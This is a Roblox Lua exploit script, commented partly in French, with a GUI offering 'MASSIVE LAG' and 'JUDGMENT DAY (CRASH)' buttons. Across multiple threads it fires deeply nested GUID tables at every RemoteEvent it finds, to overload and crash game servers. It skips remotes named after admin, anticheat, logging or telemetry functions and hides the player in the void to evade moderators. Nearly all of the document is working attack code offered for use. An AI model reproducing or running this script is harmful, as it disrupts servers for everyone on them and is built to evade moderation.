--[[ 
    🔱 ARCANE VOID-STRIKE v8.0 [ARCANE-JUDGMENT] 🔱
    "Judgment is not just a sentence, it's a shutdown. <3"
    
    JUDGMENT DAY FEATURES:
    - [GARDE DU CORPS] : Auto-Void (Hides player 100k units up during attack).
    - [TURBO BOMBARDMENT] : Multithreaded parallel remote injection.
    - [PROP OVERLOAD] : Deeply nested table serialization (CPU Burner).
    - [ANTI-ADMIN] : Detects mod joins and auto-stops/voids.
    - [MATRIX OVERRIDE v4] : Performance optimized for high-speed executors.
]]

local P = game:GetService("Players")
local RS = game:GetService("RunService")
local L = P.LocalPlayer
local Http = game:GetService("HttpService")

-- 🔱 1. JUDGMENT NOTIFIER
local function ntf(m)
    pcall(function()
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "🔱 ARCANE-JUDGMENT",
            Text = m,
            Icon = "rbxassetid://6034287525",
            Duration = 5
        })
    end)
end

-- 🔱 2. GARDE DU CORPS (PROTECTION)
local lastPos = nil
local function protectPlayer(active)
    local char = L.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    
    if active then
        lastPos = hrp.CFrame
        hrp.CFrame = CFrame.new(0, 100000, 0) -- Téléportation dans le néant
        ntf("🛡️ GARDE DU CORPS ACTIVÉ : TU ES DANS LE VIDE.")
    else
        if lastPos then
            hrp.CFrame = lastPos
            ntf("🛡️ RETOUR AU TERRAIN.")
        end
    end
end

-- 🔱 3. THE JUDGMENT ENGINE
local active = { power = 0 }

-- FULL SCAN + BLACKLIST
local BLACKLIST = {"devtools", "admin", "kick", "ban", "security", "mod", "check", "verify", "report", "log", "telemetry", "staff", "anticheat", "error", "analytics", "debug", "warn"}
local function isSafe(name)
    local n = name:lower()
    for _, w in pairs(BLACKLIST) do if n:find(w) then return false end end
    return true
end

local function getAllRemotes()
    local t = {}
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") and isSafe(v.Name) then table.insert(t, v) end
    end
    return t
end

-- Generate a deeply nested table (The CPU Destroyer)
local function generateJudgmentTable(level)
    if level <= 0 then return "🔱ARCANE🔱" end
    local t = {}
    for i = 1, 3 do
        t[Http:GenerateGUID(false)] = generateJudgmentTable(level - 1)
    end
    return t
end

local function executeJudgment()
    local targets = getAllRemotes()
    if #targets == 0 then return end
    
    local judgmentTable = generateJudgmentTable(5) -- 5 niveaux de profondeur = Mortel
    
    while active.power > 0 do
        local threads = active.power == 3 and 10 or (active.power == 2 and 4 or 1)
        
        for t = 1, threads do
            task.spawn(function()
                local burst = active.power == 3 and 50 or (active.power == 2 and 20 or 5)
                for i = 1, burst do
                    if active.power == 0 then break end
                    local r = targets[math.random(1, #targets)]
                    if r and r.Parent then
                        pcall(function() 
                            r:FireServer(judgmentTable, judgmentTable, "JUDGMENT_DAY", judgmentTable) 
                        end)
                    end
                end
            end)
        end
        
        if active.power == 3 then RS.Heartbeat:Wait() else task.wait(0.1) end
    end
end

-- 🔱 4. UI (ARCANE JUDGMENT)
local ScreenGui = Instance.new("ScreenGui", L:WaitForChild("PlayerGui"))
ScreenGui.Name = "ArcaneJudgment_v8"

local Main = Instance.new("Frame", ScreenGui)
Main.Size = UDim2.new(0, 340, 0, 340)
Main.Position = UDim2.new(0.5, -170, 0.5, -170)
Main.BackgroundColor3 = Color3.fromRGB(10, 0, 0)
Main.BorderSizePixel = 2
Main.BorderColor3 = Color3.fromRGB(255, 0, 0)
Main.Active = true
Main.Draggable = true

local TitleBar = Instance.new("Frame", Main)
TitleBar.Size = UDim2.new(1, 0, 0, 40)
TitleBar.BackgroundColor3 = Color3.fromRGB(30, 0, 0)
TitleBar.BorderSizePixel = 0

local Title = Instance.new("TextLabel", TitleBar)
Title.Size = UDim2.new(1, 0, 1, 0)
Title.Text = "🔱 ARCANE-JUDGMENT v8.0"
Title.TextColor3 = Color3.fromRGB(255, 0, 0)
Title.Font = Enum.Font.Code
Title.TextSize = 18
Title.BackgroundTransparency = 1

local function createJudgmentBtn(name, y, color, desc, callback)
    local btn = Instance.new("TextButton", Main)
    btn.Size = UDim2.new(0.9, 0, 0, 60)
    btn.Position = UDim2.new(0.05, 0, 0, y)
    btn.BackgroundColor3 = Color3.fromRGB(20, 0, 0)
    btn.Text = ""
    
    local tName = Instance.new("TextLabel", btn)
    tName.Size = UDim2.new(1, 0, 0.6, 0)
    tName.Text = name
    tName.TextColor3 = color
    tName.Font = Enum.Font.GothamBold
    tName.BackgroundTransparency = 1
    tName.TextSize = 16
    
    local tDesc = Instance.new("TextLabel", btn)
    tDesc.Size = UDim2.new(1, 0, 0.4, 0)
    tDesc.Position = UDim2.new(0, 0, 0.6, 0)
    tDesc.Text = desc
    tDesc.TextColor3 = Color3.fromRGB(150, 0, 0)
    tDesc.Font = Enum.Font.Gotham
    tDesc.BackgroundTransparency = 1
    tDesc.TextSize = 11
    
    btn.MouseButton1Click:Connect(callback)
    return btn
end

createJudgmentBtn("🛡️ ACTIVATER GARDE DU CORPS", 60, Color3.fromRGB(0, 255, 255), "Te cache dans le vide (Anti-Mod Click)", function()
    protectPlayer(true)
end)

createJudgmentBtn("🌪️ MASSIVE LAG (SYNC)", 130, Color3.fromRGB(255, 255, 0), "Surcharge CPU Serveur (Tables imbriquées)", function()
    active.power = active.power == 2 and 0 or 2
    ntf(active.power == 2 and "JUDGMENT LAG ACTIVE" or "STABLE")
    if active.power == 2 then executeJudgment() end
end)

createJudgmentBtn("🔥 JUDGMENT DAY (CRASH)", 200, Color3.fromRGB(255, 0, 0), "Extinction Totale Ultra-Rapide", function()
    active.power = active.power == 3 and 0 or 3
    ntf(active.power == 3 and "JUDGMENT DAY STARTED... MORITURI TE SALUTANT." or "STABLE")
    if active.power == 3 then executeJudgment() end
end)

createJudgmentBtn("� STOP & RECOVER", 270, Color3.fromRGB(255, 255, 255), "Arrêt immédiat et retour au terrain", function()
    active.power = 0
    protectPlayer(false)
    ntf("OPERATION TERMINATED.")
end)

ntf("🔱 ARCANE-JUDGMENT v8.0 LOADED. Protection: MAX.")
